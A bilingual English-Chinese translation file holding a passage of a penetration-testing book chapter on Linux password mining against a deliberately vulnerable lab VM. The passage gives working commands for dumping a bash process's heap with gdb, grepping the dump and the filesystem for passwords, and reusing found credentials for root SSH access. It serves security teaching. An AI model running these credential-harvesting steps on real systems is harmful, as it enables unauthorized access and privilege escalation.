- en: '*Chapter 11*: Linux Password Mining'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '*第11章*：Linux密码挖掘'
- en: Now that you have an understanding of how to utilize kernel exploits on Linux
    in order to elevate your privileges, we can begin exploring the process of searching
    for and identifying locally stored credentials on Linux systems. This process
    will involve searching for specific passwords and application credentials that
    can be used to elevate our privileges directly, without the use of any exploits.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，您已经了解了如何利用Linux上的内核漏洞提升权限，我们可以开始探索如何在Linux系统上搜索和识别本地存储的凭证。这个过程将涉及搜索可以直接提升我们权限的特定密码和应用程序凭证，而不需要使用任何漏洞。
- en: This chapter will focus on the various tools and techniques that can be used
    to find and identify passwords that can consequently provide us with an elevated
    session.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 本章将重点介绍可以用来查找和识别密码的各种工具和技术，这些密码将有助于我们获取提升后的会话。
- en: We will start off by taking a look at how to extract passwords and credentials
    stored in memory, after which we will take a look at how to identify credentials
    in application and operating system configuration files. We will then conclude
    the chapter by exploring the process of searching and identifying passwords logged
    in history files.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将首先了解如何提取存储在内存中的密码和凭证，然后再看看如何在应用程序和操作系统配置文件中识别凭证。最后，我们将通过探索在历史文件中搜索和识别密码的过程来结束本章。
- en: 'In this chapter, we''re going to cover the following main topics:'
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: 本章将涉及以下主要内容：
- en: What is password mining?
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 什么是密码挖掘？
- en: Extracting passwords from memory
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 从内存中提取密码
- en: Searching for passwords in configuration files
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 在配置文件中搜索密码
- en: Searching for passwords in history files
  id: totrans-8
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 在历史文件中搜索密码
- en: Technical requirements
  id: totrans-9
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 技术要求
- en: To follow along with the demonstrations in this chapter, you will need to ensure
    that you have familiarity with Linux Terminal commands.
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 为了跟随本章的演示，您需要确保熟悉Linux终端命令。
- en: 'You can view this chapter''s code in action here: [https://bit.ly/2Y3qA3w](https://bit.ly/2Y3qA3w)'
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以在这里查看本章代码的实际演示：[https://bit.ly/2Y3qA3w](https://bit.ly/2Y3qA3w)
- en: What is password mining?
  id: totrans-12
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 什么是密码挖掘？
- en: You should already be familiar with the password mining process and its importance
    as we covered this in [*Chapter 7*](B17389_07_Final_PG_ePub.xhtml#_idTextAnchor101),
    *Windows Password Mining*; however, there are a few nuances in the process when
    dealing with Linux systems.
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 您应该已经熟悉密码挖掘过程及其重要性，因为我们在[*第7章*](B17389_07_Final_PG_ePub.xhtml#_idTextAnchor101)《Windows密码挖掘》中已经介绍过这一点；然而，在处理Linux系统时，这个过程有一些细微的差别。
- en: Password mining is the process of searching for and enumerating encrypted or
    clear-text passwords stored in persistent or volatile memory on the target system.
    The primary objective of this process revolves around identifying potentially
    useful user account and application passwords that can expand our authority over
    a target system and potentially provide us with elevated privileges.
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: 密码挖掘是指在目标系统的持久或易失性内存中搜索和列举加密或明文密码的过程。这个过程的主要目标是识别潜在有用的用户账户和应用程序密码，这些密码可以扩大我们对目标系统的控制权，并可能为我们提供提升的权限。
- en: Given the nature of Linux distributions and deployment use cases, this process
    will differ from target to target. It is therefore important to have a good understanding
    of how and where passwords, both encrypted and clear-text, are stored on Linux
    systems.
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 由于Linux发行版和部署使用案例的性质，这个过程在不同的目标之间会有所不同。因此，了解Linux系统上密码（包括加密和明文密码）存储的位置和方式非常重要。
- en: It is also important to understand that this process relies on a series of vulnerabilities
    that are a result of an organization's or individual's password security practices.
    Poor password security practices are the primary target for attackers as they
    provide a straightforward access vector without the need for further system exploitation
    or compromise.
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 还需要理解，这一过程依赖于一系列漏洞，这些漏洞源自组织或个人的密码安全实践。密码安全实践不当是攻击者的主要目标，因为这些不当做法提供了一个直接的访问通道，无需进一步的系统利用或破坏。
- en: Because of the numerous amounts of credentials that are required by various
    platforms and applications, employees and individuals are prone to saving their
    credentials on their systems in cleartext, usually in **.doc**, **.txt**, or **.xlsx**
    files for ease of access, and are most likely to use weaker passwords comprised
    of events, names, or dates that are relevant to them. This is a significant threat
    to the security of an organization and as a result, most organizations enforce
    a password security policy as a means of remediating these issues. Password security
    policies are used to establish a baseline security level for user account passwords
    and enforce the secure storage and use of stronger passwords comprised of words
    (both uppercase and lowercase), symbols, and numbers with a recommended minimum
    length of eight digits. However, this gives rise to the occurrence of password
    reuse, where employees and individuals are likely to reuse the same password for
    multiple accounts, primarily because of the complex nature of the passwords they
    are required to use. This allows attackers to gain access to multiple accounts
    by compromising a single account password.
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 由于各种平台和应用程序需要大量凭据，员工和个人往往会将凭据以明文形式保存在他们的系统中，通常是保存在 **.doc**、**.txt** 或 **.xlsx**
    文件中以便于访问，并且很可能使用较弱的密码，这些密码由与他们相关的事件、名字或日期组成。这对组织的安全构成了重大威胁，因此，大多数组织会实施密码安全政策，以应对这些问题。密码安全政策用于为用户账户密码建立一个基本的安全级别，并强制要求以安全方式存储和使用由单词（包括大小写字母）、符号和数字组成的强密码，且推荐密码的最小长度为八位数字。然而，这也导致了密码重复使用的现象，员工和个人往往会对多个账户使用相同的密码，主要是因为他们需要使用的密码过于复杂。这使得攻击者可以通过破解一个账户的密码，获得多个账户的访问权限。
- en: An additional security vulnerability or risk involves Linux user account passwords
    and how they are stored. Linux encrypts and stores user account passwords locally.
    After initial access has been obtained by an attacker, user account hashes can
    be dumped from memory and can be cracked depending on the length and strength
    of the password. We will explore the advantages and drawbacks of this technique
    later in this chapter.
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 另一个额外的安全漏洞或风险涉及 Linux 用户账户密码及其存储方式。Linux 会加密并本地存储用户账户密码。在攻击者获得初步访问权限后，用户账户的哈希值可以从内存中转储，并且可以根据密码的长度和强度进行破解。我们将在本章稍后讨论这种技术的优缺点。
- en: From an organizational standpoint, Linux is also used to host third-party business-critical
    applications that come with their own security vulnerabilities. Most of these
    applications implement some form of access control and consequently require user
    authentication in the form of a username and password combination. These applications
    are also prone to storing credentials locally in either clear-text or in an encrypted
    format. After successful exploitation, attackers can locate these credentials,
    decrypt them (if weak), and use them to gain access to the application and consequently
    expand their domain of control over a system or network.
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 从组织的角度来看，Linux 还用于托管一些具有自身安全漏洞的第三方业务关键应用程序。大多数这些应用程序实现了某种形式的访问控制，因此需要通过用户名和密码组合进行用户身份验证。这些应用程序也容易将凭据以明文或加密格式本地存储。在成功利用这些漏洞后，攻击者可以定位这些凭据，解密它们（如果加密较弱），并用它们来访问应用程序，从而扩大对系统或网络的控制范围。
- en: Now that you have an understanding of what password mining is, we can take a
    look at how to set up our target **virtual machine** (**VM**) that we will use
    for the remainder of the chapters in this book.
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，您已经了解了什么是密码挖掘，我们可以看看如何设置我们的目标 **虚拟机**（**VM**），我们将在本书剩余的章节中使用它。
- en: Setting up our environment
  id: totrans-21
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 设置我们的环境
- en: In this chapter, we will be utilizing a customized Debian 6 VM that has been
    configured to be vulnerable and that will provide us with a robust environment
    to learn and demonstrate the password mining process.
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将使用一个定制的 Debian 6 虚拟机（**VM**），该虚拟机已配置为易受攻击，并将为我们提供一个强大的环境，以便学习和演示密码挖掘过程。
- en: 'To begin setting up the VM, follow the procedures outlined next:'
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 要开始设置虚拟机，请按照接下来的步骤进行操作：
- en: 'The first step in the process involves downloading the VM **Open Virtualization
    Appliance** (**OVA**) file required to set up the target system with VirtualBox.
    The OVA file can be downloaded from the following link: [https://www.dropbox.com/s/e8anrvbxvqidw3w/Debian%206%2064-bit%20%28Workshop%29.ova?dl=0](https://www.dropbox.com/s/e8anrvbxvqidw3w/Debian%206%2064-bit%20%28Workshop%29.ova?dl=0).'
  id: totrans-24
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 该过程的第一步是下载VM所需的**开放虚拟化应用程序**（**OVA**）文件，以便使用VirtualBox设置目标系统。可以通过以下链接下载OVA文件：[https://www.dropbox.com/s/e8anrvbxvqidw3w/Debian%206%2064-bit%20%28Workshop%29.ova?dl=0](https://www.dropbox.com/s/e8anrvbxvqidw3w/Debian%206%2064-bit%20%28Workshop%29.ova?dl=0)。
- en: In order to import the VM into VirtualBox, you will need to double-click the
    **Debian 6 64-bit (Workshop)** file, as highlighted in the following screenshot:![Figure
    11.1 – VM file
  id: totrans-25
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为了将VM导入VirtualBox，你需要双击**Debian 6 64-bit（Workshop）**文件，如下面的截图所示：![图 11.1 – VM
    文件
- en: '](Images/B17389_11_001.jpg)'
  id: totrans-26
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_11_001.jpg)'
- en: Figure 11.1 – VM file
  id: totrans-27
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.1 – VM 文件
- en: After double-clicking on the OVA file, you will be prompted with the VirtualBox
    import wizard, as highlighted in the following screenshot:![Figure 11.2 – VirtualBox
    import wizard
  id: totrans-28
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 双击OVA文件后，你会看到如下面截图所示的VirtualBox导入向导：![图 11.2 – VirtualBox 导入向导
- en: '](Images/B17389_11_002.jpg)'
  id: totrans-29
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_11_002.jpg)'
- en: Figure 11.2 – VirtualBox import wizard
  id: totrans-30
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.2 – VirtualBox 导入向导
- en: The VirtualBox import wizard will prompt you to specify the VM base folder,
    as highlighted in the preceding screenshot. After this, you can click on the **Import**
    button to begin the import process.
  id: totrans-31
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: VirtualBox 导入向导会提示你指定VM的基础文件夹，如前面的截图所示。之后，你可以点击**导入**按钮开始导入过程。
- en: 'After the VM has been imported into VirtualBox, you will need to add it to
    the **Virtual Hacking Lab** network we created in [*Chapter 2*](B17389_02_Final_PG_ePub.xhtml#_idTextAnchor030)
    of this book, *Setting Up Our Lab*, as highlighted in the following screenshot:'
  id: totrans-32
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 将VM导入VirtualBox后，你需要将其添加到我们在本书[*第2章*](B17389_02_Final_PG_ePub.xhtml#_idTextAnchor030)《设置我们的实验室》中创建的**虚拟黑客实验室**网络中，如下图所示：
- en: '![Figure 11.3 – VirtualBox network settings'
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 11.3 – VirtualBox 网络设置'
- en: '](Images/B17389_11_003.jpg)'
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_11_003.jpg)'
- en: Figure 11.3 – VirtualBox network settings
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.3 – VirtualBox 网络设置
- en: Once you have configured the VM to use the custom network, you can save the
    changes and boot up the VM to get started.
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦你配置好VM使用自定义网络，可以保存更改并启动VM，开始操作。
- en: 'You will require an initial foothold on the system in order to follow along
    with the techniques and demonstrations in this chapter. You can gain an initial
    foothold on the system by remotely authenticating to the target via **Secure Shell**
    (**SSH**) with the following credentials: username (**user**) and password (**password321**).'
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: 你需要在系统上获得初步的控制权限，才能跟随本章中的技术和演示。你可以通过**安全外壳协议**（**SSH**）使用以下凭证远程认证到目标系统，从而获得初步控制权限：用户名（**user**）和密码（**password321**）。
- en: These credentials will provide you with an unprivileged session on the target
    system that we can use as a starting point to elevate our privileges.
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 这些凭证将为你提供一个在目标系统上的无特权会话，我们可以利用该会话作为提升权限的起点。
- en: Extracting passwords from memory
  id: totrans-39
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 从内存中提取密码
- en: We can begin the password mining process by exploring an uncommon technique
    that can be used to extract application passwords from memory. The viability and
    success of this technique will depend on the type of applications that are running
    on the target and its deployment use case.
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以通过探索一种不常见的技术来开始密码挖掘过程，该技术可以从内存中提取应用程序密码。此技术的可行性和成功与否将取决于目标上运行的应用程序类型及其部署用例。
- en: Applications and services that utilize username and password authentication
    may store credentials in user-space memory, either in cleartext or in an encrypted
    state. Dumping and analyzing the memory of a particular service may reveal credentials
    pertinent to the application. We can use these credentials to gain access and
    take control of the particular service; alternatively, we can use the discovered
    credentials for authentication to other user accounts in order to elevate our
    privileges. This is because many users and system administrators are prone to
    reusing passwords for various applications and their user accounts.
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: 使用用户名和密码认证的应用程序和服务可能会将凭证存储在用户空间内存中，无论是以明文形式还是加密状态。通过转储和分析特定服务的内存，可能会揭示与应用程序相关的凭证。我们可以使用这些凭证来获得访问权限并控制该服务；另外，我们还可以使用发现的凭证进行其他用户帐户的认证，以提升我们的权限。这是因为许多用户和系统管理员倾向于为各种应用程序和用户帐户重复使用密码。
- en: We can use the **GNU Debugger** (**GDB**) to dump the memory of a running service
    or application in order to reveal clear-text or encrypted passwords.
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以使用**GNU调试器**（**GDB**）转储运行中的服务或应用程序的内存，以揭示明文或加密密码。
- en: Note
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: 注意
- en: GDB is a portable debugger that runs on various Unix-like systems and can be
    used to debug various programming languages.
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: GDB是一个可移植的调试器，能够在各种类似Unix的系统上运行，并可用于调试各种编程语言。
- en: This technique requires a procedural approach and will vary from system to system
    based on the types of applications that are running on the target.
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 这一技术需要一个程序化的方法，并且根据目标系统上运行的应用类型，不同系统之间会有所不同。
- en: 'We can begin the process by following the procedures outlined next:'
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以按照接下来概述的程序开始这个过程：
- en: 'The first step in the process involves identifying services running on the
    target system that utilize authentication or services that may have been used
    to authenticate with other services. This can be done by running the following
    command on the target system:'
  id: totrans-47
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 过程的第一步是识别目标系统上运行的服务，这些服务利用身份验证或可能曾用于与其他服务进行身份验证。可以通过在目标系统上运行以下命令来完成：
- en: '**ps -ef**'
  id: totrans-48
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**ps -ef**'
- en: This command will outline a list of all running services on the system and their
    corresponding **process identifier** (**PID**).
  id: totrans-49
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 该命令将列出系统上所有正在运行的服务及其对应的**进程标识符**（**PID**）。
- en: 'As highlighted in the following screenshot, we are able to identify various
    services running as **user**:'
  id: totrans-50
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下图所示，我们可以识别出作为**用户**运行的各种服务：
- en: '![Figure 11.4 – Bash process](Images/B17389_11_004.jpg)'
  id: totrans-51
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![图11.4 – Bash进程](Images/B17389_11_004.jpg)'
- en: Figure 11.4 – Bash process
  id: totrans-52
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图11.4 – Bash进程
- en: 'We can also manually search for specific services that are likely to utilize
    authentication. This can be done by running the following command:'
  id: totrans-53
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 我们也可以手动搜索可能会使用身份验证的特定服务。可以通过运行以下命令来完成：
- en: '**ps -ef | grep <SERVICE_NAME>**'
  id: totrans-54
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**ps -ef | grep <SERVICE_NAME>**'
- en: This command utilizes the **grep** utility to limit the results to the processes
    that match the keyword.
  id: totrans-55
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 该命令利用**grep**工具将结果限制为与关键字匹配的进程。
- en: As highlighted in *Figure 11.4*, we are able to identify a Bash session and
    its corresponding PID.
  id: totrans-56
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如*图11.4*所示，我们能够识别出一个Bash会话及其对应的PID。
- en: 'We can utilize GDB to dump the memory of the **Bash** service in order to reveal
    credentials that may have been entered in the Bash session earlier on by other
    users. This can be done by running the following command on the target system:'
  id: totrans-57
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们可以利用GDB转储**Bash**服务的内存，以揭示可能在Bash会话中由其他用户输入的凭据。这可以通过在目标系统上运行以下命令来完成：
- en: '**gdb -p <PID>**'
  id: totrans-58
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**gdb -p <PID>**'
- en: This command is used to specify the specific PID that you want to analyze with
    GDB. In this case, ensure that you specify the PID for the Bash service, as highlighted
    in *Figure 11.4*.
  id: totrans-59
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 该命令用于指定你想要用GDB分析的特定PID。在这种情况下，确保指定Bash服务的PID，如*图11.4*所示。
- en: 'The next step involves listing all mapped memory regions for the process. This
    can be done by running the following command in the GDB:'
  id: totrans-60
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下一步是列出该进程的所有映射内存区域。可以通过在GDB中运行以下命令来完成：
- en: '**info proc mappings**'
  id: totrans-61
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**info proc mappings**'
- en: 'If successful, the GDB should output the mapped address spaces for the service,
    as highlighted in the following screenshot:'
  id: totrans-62
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如果成功，GDB应该输出服务的映射地址空间，如下图所示：
- en: '![Figure 11.5 – GDB mapped address spaces'
  id: totrans-63
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图11.5 – GDB映射的地址空间'
- en: '](Images/B17389_11_005.jpg)'
  id: totrans-64
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_11_005.jpg)'
- en: Figure 11.5 – GDB mapped address spaces
  id: totrans-65
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图11.5 – GDB映射的地址空间
- en: Take note of the start and end addresses for the heap, as highlighted in the
    preceding screenshot, as we will need these addresses in order to dump the memory
    of the service.
  id: totrans-66
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 注意堆内存的起始和结束地址，如前面的截图所示，因为我们需要这些地址来转储服务的内存。
- en: 'We can now dump the memory of the service by specifying the start and end addresses
    of the heap allocation. This can be done by running the following command in the
    GDB:'
  id: totrans-67
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，我们可以通过指定堆分配的起始和结束地址来转储服务的内存。这可以通过在GDB中运行以下命令来完成：
- en: '**dump memory <OUTPUT_FILE> <START_ADDRESS> <STOP_ADDRESS>**'
  id: totrans-68
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**dump memory <OUTPUT_FILE> <START_ADDRESS> <STOP_ADDRESS>**'
- en: This command will output the contents of the heap memory for the Bash service
    into an output file that we can analyze.
  id: totrans-69
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 该命令将把Bash服务的堆内存内容输出到一个可以进行分析的输出文件中。
- en: Note
  id: totrans-70
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 注意
- en: Heap memory, also known as dynamic memory, is used by applications to store
    global variables.
  id: totrans-71
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 堆内存，也称为动态内存，是应用程序用来存储全局变量的。
- en: 'After dumping the memory of the Bash service into a file, we can utilize the
    **strings** utility to identify potentially useful information and credentials.
    This can be done by running the following command on the target system:'
  id: totrans-72
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在将 Bash 服务的内存转储到文件后，我们可以使用**strings**工具来识别潜在有用的信息和凭据。可以通过在目标系统上运行以下命令来实现：
- en: '**strings /<OUTPUT_FILE> | grep passw**'
  id: totrans-73
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**strings /<OUTPUT_FILE> | grep passw**'
- en: This command will identify all strings in the output file and search for any
    occurrences of the **passw** keyword.
  id: totrans-74
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 此命令将识别输出文件中的所有字符串，并搜索任何出现的**passw**关键字。
- en: 'As highlighted in the following screenshot, we are able to identify an authentication
    command to MySQL with the username and password specified in cleartext:'
  id: totrans-75
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如以下截图所示，我们能够识别到一个明确列出的 MySQL 身份验证命令，包括用户名和密码：
- en: '![Figure 11.6 – MySQL credentials dumped from memory'
  id: totrans-76
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 11.6 – 从内存中转储的 MySQL 凭据'
- en: '](Images/B17389_11_006.jpg)'
  id: totrans-77
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_11_006.jpg)'
- en: Figure 11.6 – MySQL credentials dumped from memory
  id: totrans-78
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.6 – 从内存中转储的 MySQL 凭据
- en: We can now use these credentials to gain root access to the MySQL server, as
    the credentials specified in the authentication command use the root account.
    However, the target isn't running a MySQL server.
  id: totrans-79
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 我们现在可以使用这些凭据获得 MySQL 服务器的 root 访问权限，因为在身份验证命令中指定的凭据使用了 root 账户。然而，目标并没有运行 MySQL
    服务器。
- en: 'Alternatively, we can utilize the MySQL credentials to try to gain access to
    the root account on the target system via SSH in the event the root user has reused
    their password for other services. This can be done by running the following command:'
  id: totrans-80
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 另外，如果 root 用户为其他服务重复使用密码，我们可以利用 MySQL 凭据尝试通过 SSH 获得对目标系统的 root 账户的访问权限。可以通过运行以下命令来实现：
- en: '**ssh root@<TARGET-IP>**'
  id: totrans-81
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**ssh root@<TARGET-IP>**'
- en: 'As highlighted in the following screenshot, authentication with the MySQL credentials
    is successful, and you should now have root access to the target system:'
  id: totrans-82
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如以下截图所示，使用 MySQL 凭据进行身份验证成功，您现在应该能够访问目标系统的 root 权限：
- en: '![Figure 11.7 – Successful SSH authentication'
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 11.7 – 成功的 SSH 身份验证'
- en: '](Images/B17389_11_007.jpg)'
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_11_007.jpg)'
- en: Figure 11.7 – Successful SSH authentication
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11.7 – 成功的 SSH 身份验证
- en: 'We have now been able to successfully elevate our privileges by dumping and
    analyzing the memory of a specific service. In this case, we were able to get
    access to the root account on the system primarily because of poor security practices
    by the administrator or root user. The following mistakes or poor security practices
    led to the successful elevation of our privileges:'
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在已经能够成功通过转储和分析特定服务的内存来提升我们的权限。在这种情况下，我们能够访问系统上的 root 账户，主要原因是管理员或 root 用户的安全实践不当。以下的错误或不当的安全实践导致了我们成功提升权限：
- en: Password reuse by the administrator or root user.
  id: totrans-87
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 管理员或 root 用户的密码重复使用。
- en: The MySQL authentication command included the username and the password.
  id: totrans-88
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: MySQL 身份验证命令包含了用户名和密码。
- en: These mistakes are commonly made by users and system administrators on Linux
    servers and should always be tested as they can reveal very important information
    that can be used to elevate your privileges on the target system.
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 这些错误是 Linux 服务器上的用户和系统管理员常犯的错误，必须始终进行测试，因为它们可能揭示出非常重要的信息，这些信息可以用来提升在目标系统上的权限。
- en: Now that you have an understanding of how to dump the memory of processes and
    how to search for and identify credentials, we can begin exploring the process
    of searching for passwords in configuration files.
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，您已经了解了如何转储进程的内存以及如何查找和识别凭据，我们可以开始探索在配置文件中查找密码的过程。
- en: Searching for passwords in configuration files
  id: totrans-91
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 在配置文件中查找密码
- en: An application provides an enticing target for attackers as weaknesses and vulnerabilities
    in it and its storage of credentials can lead to complete system compromise or
    elevated privileges.
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: 应用程序为攻击者提供了一个诱人的目标，因为其中的弱点和漏洞以及它存储凭据的方式可能导致整个系统被攻破或权限提升。
- en: This section will be focused on finding and enumerating application credentials.
    The techniques demonstrated in this section will depend on the type of target
    you are dealing with and its deployment use case. In our particular case, our
    target VM is set up to be a server and has various applications installed.
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 本节将重点介绍查找和列举应用程序凭据。本节演示的技术将取决于您处理的目标类型及其部署用例。在我们的特定案例中，我们的目标虚拟机被设置为服务器，并安装了各种应用程序。
- en: The first step of this process involves searching for passwords in various files
    stored locally; this will allow us to identify any user or application passwords
    in text or configuration files. This can be achieved through the use of inbuilt
    Linux utilities that allows us to search for specific strings in files with specific
    extensions.
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 该过程的第一步涉及在本地存储的各种文件中搜索密码；这将帮助我们识别文本或配置文件中的任何用户或应用程序密码。通过使用内置的 Linux 工具，可以在特定扩展名的文件中搜索特定的字符串来实现这一点。
- en: Searching for passwords
  id: totrans-95
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 搜索密码
- en: 'We can get started with the password searching process by following the procedures
    outlined next:'
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以按照接下来概述的程序开始密码搜索过程：
- en: 'We can start off by searching for files that contain passwords. This can be
    done by leveraging the **grep** utility, as follows:'
  id: totrans-97
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们可以通过搜索包含密码的文件来开始。这可以通过利用**grep**工具来完成，如下所示：
- en: '**grep --color=auto -rnw ''/'' -ie "PASSWORD" --color=always 2> /dev/null**'
  id: totrans-98
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**grep --color=auto -rnw ''/'' -ie "PASSWORD" --color=always 2> /dev/null**'
- en: 'This command will perform a recursive scan from the root of the filesystem
    and will output a list of files that contain the **password** keyword and will
    color code the results accordingly, as illustrated in the following screenshot:'
  id: totrans-99
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 此命令将从文件系统根目录开始递归扫描，并输出包含**password**关键字的文件列表，并根据需要对结果进行着色，如下图所示：
- en: '![Figure 11.8 – grep results'
  id: totrans-100
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 11.8 – grep 结果'
- en: '](Images/B17389_11_008.jpg)'
  id: totrans-101
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_11_008.jpg)'
- en: Figure 11.8 – grep results
  id: totrans-102
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 11.8 – grep 结果
- en: Note
  id: totrans-103
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 注意
- en: It is recommended to alternate between the use of the **password** keyword and
    abbreviated variations of the keyword, such as **pass** or **passw**. This is
    because configuration files will store credentials under different names and may
    use abbreviated versions of the keyword.
  id: totrans-104
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 建议交替使用**password**关键字和其简写形式，如**pass**或**passw**。这是因为配置文件会以不同的名称存储凭证，并且可能会使用关键字的简写形式。
- en: 'The command will output quite a bit of data, which can make it difficult to
    identify any potentially useful credentials. As a result, we will need to narrow
    down our search to specific directories that contain useful configuration files
    for applications and services. This can be done by running the following command:'
  id: totrans-105
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 该命令将输出大量数据，这可能使得识别任何有用凭证变得困难。因此，我们需要将搜索范围缩小到包含应用程序和服务的有用配置文件的特定目录。这可以通过运行以下命令来完成：
- en: '**grep --color=auto -rnw ''/etc'' -ie "PASSWORD" --color=always 2> /dev/null**'
  id: totrans-106
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**grep --color=auto -rnw ''/etc'' -ie "PASSWORD" --color=always 2> /dev/null**'
- en: 'This command will limit the results to the configuration files found in the
